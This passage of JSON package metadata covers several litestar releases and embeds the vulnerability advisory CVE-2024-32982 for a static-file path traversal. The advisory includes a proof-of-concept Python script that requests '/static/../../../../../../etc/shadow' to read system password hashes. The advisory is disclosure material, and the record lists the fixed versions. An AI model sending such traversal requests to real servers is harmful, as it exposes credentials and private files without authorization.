[LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.6.3":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.6.3/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.6.3","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"2e509e0656c6246fb82f6f9392992a5ce22a3497ea964fb8c209fce478ada767","md5":"1e541f19370fc34c763d6e66fd85e71d","sha256":"a923c32abe8bd50891a0c8162700716ed33ffc738e8b0e7d3668db9447266cf6"},"downloads":-1,"filename":"litestar-2.6.3-py3-none-any.whl","has_sig":false,"md5_digest":"1e541f19370fc34c763d6e66fd85e71d","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":509126,"upload_time":"2024-03-04T11:32:28","upload_time_iso_8601":"2024-03-04T11:32:28.001837Z","url":"https://files.pythonhosted.org/packages/2e/50/9e0656c6246fb82f6f9392992a5ce22a3497ea964fb8c209fce478ada767/litestar-2.6.3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8c5059f9b52fa2910c6eea751866918391e576c8c18d7687bfe2b728a08e3ce3","md5":"36c4b83702fc7b5531be943d50278bbd","sha256":"970f5c957b93f2cdbe193b3d20f2b3cd9de7ac2604f5d330ad2290c8295d99fc"},"downloads":-1,"filename":"litestar-2.6.3.tar.gz","has_sig":false,"md5_digest":"36c4b83702fc7b5531be943d50278bbd","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":655393,"upload_time":"2024-03-04T11:32:29","upload_time_iso_8601":"2024-03-04T11:32:29.962004Z","url":"https://files.pythonhosted.org/packages/8c/50/59f9b52fa2910c6eea751866918391e576c8c18d7687bfe2b728a08e3ce3/litestar-2.6.3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.6.4":{"info":{"author":null,"author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.6.4/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy<1.0.0,>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","python-jose; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","python-jose; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy<1.0.0,>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.6.4","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"d07a9fd5fad576cfeeea357f5d0864ee5a672d80a03285459b35d6820631d00b","md5":"913ea83b4cab7579c63215783da864c3","sha256":"b50fc7815535140a77f198885f7f39ffdf1a594a0e61bf8d3c2ed12db212e5be"},"downloads":-1,"filename":"litestar-2.6.4-py3-none-any.whl","has_sig":false,"md5_digest":"913ea83b4cab7579c63215783da864c3","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":509345,"upload_time":"2024-05-06T07:21:36","upload_time_iso_8601":"2024-05-06T07:21:36.875478Z","url":"https://files.pythonhosted.org/packages/d0/7a/9fd5fad576cfeeea357f5d0864ee5a672d80a03285459b35d6820631d00b/litestar-2.6.4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"5c5a7e4febd2507fef5999f2b9aa5548afb3d2224ec9c2e67f1e113da967af09","md5":"ea9e29d6806bdc34786473956f237a5d","sha256":"720f648d567627519b188441ffa32b4d4f534b6bd6634cbcd093c341997774da"},"downloads":-1,"filename":"litestar-2.6.4.tar.gz","has_sig":false,"md5_digest":"ea9e29d6806bdc34786473956f237a5d","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":656481,"upload_time":"2024-05-06T07:21:39","upload_time_iso_8601":"2024-05-06T07:21:39.012756Z","url":"https://files.pythonhosted.org/packages/5c/5a/7e4febd2507fef5999f2b9aa5548afb3d2224ec9c2e67f1e113da967af09/litestar-2.6.4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.7.0":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar-919193495116337154","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.7.0/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < '3.11'","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; (sys_platform != 'win32') and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.7.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"79077890327249c909b64352a6b9a2f70ba5a28cb3114caa37066b216a98e4d4","md5":"639c948522cb824ff8bdf81d960c8a09","sha256":"62eabe89c08a1a5b66063bf9d8ec7677368bf7d3593c0579fb3605dd61b486a3"},"downloads":-1,"filename":"litestar-2.7.0-py3-none-any.whl","has_sig":false,"md5_digest":"639c948522cb824ff8bdf81d960c8a09","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":511342,"upload_time":"2024-03-10T17:12:45","upload_time_iso_8601":"2024-03-10T17:12:45.882450Z","url":"https://files.pythonhosted.org/packages/79/07/7890327249c909b64352a6b9a2f70ba5a28cb3114caa37066b216a98e4d4/litestar-2.7.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"0d30ae698ecf335a470efacd38e10c933bfa69f801bce5d0614865153559cd9d","md5":"deda54a29abffe8a992650fb10e26538","sha256":"30f703b513d8c8a7f82e3b5cd583b071147f7e60b929650eeeeb00ff0ff65582"},"downloads":-1,"filename":"litestar-2.7.0.tar.gz","has_sig":false,"md5_digest":"deda54a29abffe8a992650fb10e26538","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":660799,"upload_time":"2024-03-10T17:12:48","upload_time_iso_8601":"2024-03-10T17:12:48.788896Z","url":"https://files.pythonhosted.org/packages/0d/30/ae698ecf335a470efacd38e10c933bfa69f801bce5d0614865153559cd9d/litestar-2.7.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal 